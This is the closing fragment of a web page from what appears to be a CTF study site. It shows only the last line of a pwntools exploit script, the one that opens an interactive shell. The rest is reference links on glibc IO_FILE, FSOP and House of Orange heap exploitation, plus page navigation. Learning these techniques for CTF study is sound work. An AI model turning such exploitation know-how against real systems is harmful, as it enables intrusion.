p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br><span class="line-number">68</span><br><span class="line-number">69</span><br><span class="line-number">70</span><br></div></div><h2 id="参考链接">参考链接 <a href="#参考链接" class="header-anchor">#</a></h2> <p>https://www.anquanke.com/post/id/177910</p> <p>https://www.anquanke.com/post/id/177958</p> <p>https://ray-cp.github.io/archivers/IO_FILE_fwrite_analysis</p> <p>https://ray-cp.github.io/archivers/IO_FILE_vtable_hajack_and_fsop</p> <p>https://orangegzy.github.io/2020/08/18/houseoforange-hitcon-2016-FSOP/</p> <p>https://fl0ey.icu/2020/10/15/house_of_orange/</p> <p>https://zhuanlan.zhihu.com/p/65873040</p></div> <footer class="page-edit"><!----> <div class="last-updated"><span class="prefix">上次更新:</span> <span class="time">11/9/2022, 9:47:53 AM</span></div></footer> <div class="page-nav"><p class="inner"><span class="prev"><a href="/knowledge/ctf/how2heap.html" class="prev"><i aria-label="icon: left" class="anticon anticon-left"><svg viewBox="64 64 896 896" focusable="false" data-icon="left" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M724 218.3V141c0-6.7-7.7-10.4-12.9-6.3L260.3 486.8a31.86 31.86 0 0 0 0 50.3l450.8 352.1c5.3 4.1 12.9.4 12.9-6.3v-77.3c0-4.9-2.3-9.6-6.1-12.6l-360-281 360-281.1c3.8-3 6.1-7.7 6.1-12.6z"></path></svg></i>
        【PWN】how2heap
      </a></span> <span class="next"><a href="/knowledge/ctf/32264.html">
        【RE】32位调用64位exe程序
        <i aria-label="icon: right" class="anticon anticon-right"><svg viewBox="64 64 896 896" focusable="false" data-icon="right" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M765.7 486.8L314.9 134.7A7.97 7.97 0 0 0 302 141v77.3c0 4.9 2.3 9.6 6.1 12.6l360 281.1-360 281.1c-3.9 3-6.1 7.7-6.1 12.6V883c0 6.7 7.7 10.4 12.9 6.3l450.8-352.1a31.96 31.96 0 0 0 0-50.4z"></path></svg></i></a></span></p></div> </main> <!----></div><div class="global-ui"></div></div>
    <script src="/assets/js/app.1a115c3b.js" defer></script><script src="/assets/js/2.6564a6f0.js" defer></script><script src="/assets/js/44.afebd532.js" defer></script>
  </body>
</html>